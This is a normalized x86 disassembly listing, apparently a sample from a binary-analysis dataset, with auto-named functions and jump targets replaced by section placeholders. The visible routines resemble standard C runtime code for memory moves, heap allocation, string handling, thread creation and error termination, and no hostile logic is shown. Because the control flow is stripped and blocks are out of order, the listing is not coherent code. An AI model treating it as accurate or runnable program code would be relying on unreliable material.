mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000ce80 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000cce4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000cce4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000cce4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000ce80 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000ce80 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000ce80 ]
sub_1000ced5
push 0xc
push r--data
call sub_1000ed24
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1000ed69
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_100120e7
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_1001211a
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_1000ecdb
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000ec99
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000cf2b
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_1001214a
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_1000cf63
push 0xc
push r--data
call sub_1000ed24
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_1000ed69
retn
push 0x4
call sub_100120e7
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_100128f9
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000cfa9
sub_1000cfb2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_10010fec
pop ecx
call sub_1000ecdb
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_1001309c
push 0x1e
call sub_10012ef1
push 0xff
call sub_10012c62
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_1000cf63
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_1000ecdb
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_10010fec
pop ecx
test eax eax
je r-xdata
call sub_1000ecdb
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_1000d08c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000d07c
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000c4b4
pop ecx
sub_1000d0ad
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_10013150
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_1000d0cd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_1000ecdb
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop edi
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1000cb70
add esp 0xc
call sub_1000ecdb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_1000d8e6
add esp 0x14
mov eax esi
jmp r-xdata
sub_1000d12a
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_10011106
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000fe8a
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_1000d1a7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_10013ee4
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_10013b6a
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_100133fe
mov [ esi + 0x4 ] eax
sub_1000d22e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10014228
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10014228
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_10014370
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_1000d320
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000d22e
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_1000ecdb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_10014370
sub_1000d38f
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_10014440
mov esi eax
inc esi
push esi
call sub_1000cfb2
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx ]
push esi
push eax
call sub_100143d1
add esp 0xc
jmp r-xdata
sub_1000d3ff
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_10014440
mov edi eax
inc edi
push edi
call sub_1000cfb2
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_100143d1
add esp 0xc
jmp r-xdata
sub_1000d47f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000d45c
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000c4b4
pop ecx
sub_1000d4a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push edi
push esi
call sub_10014440
xor edi edi
pop ecx
cmp esi edi
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
call sub_1000ecdb
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
pop edi
leave
retn
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp - 0x1c ] eax
sub_1000d50a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_10014595
call sub_1000d4a0
add esp 0x10
pop esi
pop ebp
retn
sub_1000d530
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_1000d5fe
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_10013e6b
test eax eax
je r-xdata
push r--data
call sub_10015840
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
push eax
call sub_1001402d
pop ecx
call [ r--data ]
sub_1000d67c
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10013cf6
call sub_10013cf0
push eax
call sub_10013cd6
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
mov [ eax + 0x54 ] edx
mov edx [ ecx + 0x58 ]
mov [ eax + 0x58 ] edx
mov edx [ ecx + 0x4 ]
push ecx
mov [ eax + 0x4 ] edx
call sub_10013efe
mov esi [ ebp + 0x8 ]
push esi
call sub_10013cf0
push eax
call sub_10013d2a
test eax eax
jne r-xdata
call sub_1000d63b
push r--data
call sub_10015840
pop ecx
test eax eax
je r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call [ ExitThread@IAT ]
call [ r--data ]
cmp [ r--data ] 0x0
je r-xdata
sub_1000d6ff
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp edi ebx
jne r-xdata
push esi
call sub_10013cf6
push 0x214
push 0x1
call sub_10015ac2
mov esi eax
pop ecx
pop ecx
cmp esi ebx
je r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
xor eax eax
jmp r-xdata
push esi
call sub_1000ced5
pop ecx
cmp [ ebp - 0x4 ] ebx
je r-xdata
call sub_10013ee4
push [ eax + 0x6c ]
push esi
call sub_10013d84
mov eax [ ebp + 0x14 ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x1c ]
pop ecx
pop ecx
mov [ esi + 0x54 ] edi
cmp eax ebx
jne r-xdata
pop edi
pop ebx
leave
retn
xor eax eax
push [ ebp - 0x4 ]
call sub_1000ed01
pop ecx
push eax
push [ ebp + 0x18 ]
push esi
push sub_1000d67c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateThread@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp + 0x10 ]
pop esi
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
sub_1000d7be
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_1000fe10
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_10015bae
pop ecx
sub_1000d8e6
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_10013c5b
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_10015bae
pop ecx
pop ebp
jmp sub_1000d7be
pop ebp
jmp eax
sub_1000d91c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x103
lea eax [ ebp - 0x10 ]
push eax
push 0x103
push [ ebp + 0x8 ]
call sub_10015bb6
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1000d972
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1000d91c
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x103
pop ebp
retn
sub_1000d9a2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_10015bb6
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1000d9f3
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1000d9a2
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_1000da21
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_10015bb6
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1000da77
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1000da21
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_1000daa7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_10015bb6
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1000daf8
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1000daa7
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_1000db5a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_1000ecdb
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_1000fe10
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_100109a0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_1000ecdb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_1000d8e6
add esp 0x14
mov eax esi
jmp r-xdata
sub_1000dbd7
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
cmp esi ebx
je r-xdata
cmp edi ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x20 ]
call sub_1000d1a7
cmp esi ebx
je r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov esi [ ebp - 0x20 ]
cmp [ esi + 0x14 ] ebx
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
lea ecx [ ebp - 0x10 ]
push ecx
push ebx
push ebx
push ebx
push 0xffffffff
push edi
push ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
push edi
call sub_10015c6e
pop ecx
jmp r-xdata
cmp [ esi + 0xac ] 0x1
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
call sub_1000ecdb
mov [ eax ] 0x2a
cmp [ ebp - 0x14 ] bl
je r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
push [ ebp + 0x10 ]
push [ ebp - 0x28 ]
push 0xffffffff
push edi
push ebx
push [ esi + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
mov eax 0xff
cmp [ edi ] ax
ja r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
push [ ebp + 0x10 ]
push [ ebp - 0x28 ]
push [ ebp + 0x10 ]
push edi
push ebx
push [ esi + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov eax edi
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ edi ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x24 ]
mov [ edx + eax ] cl
mov cx [ edi ]
inc edi
inc edi
test cx cx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
je r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
cmp ecx ebx
je r-xdata
inc eax
inc eax
dec ecx
jne r-xdata
inc eax
mov [ ebp - 0x24 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp edi [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x28 ]
cmp [ ecx + eax - 0x1 ] bl
jne r-xdata
cmp [ eax ] bx
jne r-xdata
cmp [ eax ] bx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
push [ esi + 0xac ]
lea eax [ ebp - 0xc ]
push eax
push 0x1
push [ ebp - 0x2c ]
push ebx
push [ esi + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
jmp r-xdata
sub eax edi
sar eax 0x1
inc eax
mov [ ebp + 0x10 ] eax
cmp [ ebp - 0x10 ] ebx
jne r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
cmp eax ebx
jl r-xdata
cmp eax 0x5
ja r-xdata
lea ecx [ eax + edi ]
cmp ecx [ ebp + 0x10 ]
ja r-xdata
xor edx edx
cmp eax ebx
jle r-xdata
add [ ebp - 0x2c ] 0x2
mov cl [ ebp + edx - 0xc ]
mov eax [ ebp - 0x28 ]
mov [ eax + edi ] cl
cmp cl bl
je r-xdata
inc edx
inc edi
cmp edx [ ebp - 0x24 ]
jl r-xdata
sub_1000de33
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_10015bb6
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x10 ]
push eax
push ebx
push ebx
push esi
call sub_10014440
pop ecx
push eax
lea eax [ ebp - 0x28 ]
push esi
push eax
call sub_10015c88
fld [ eax + 0x10 ]
add esp 0x18
cmp [ ebp - 0x4 ] bl
je r-xdata
inc esi
jmp r-xdata
cmp eax ebx
je r-xdata
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1000def1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
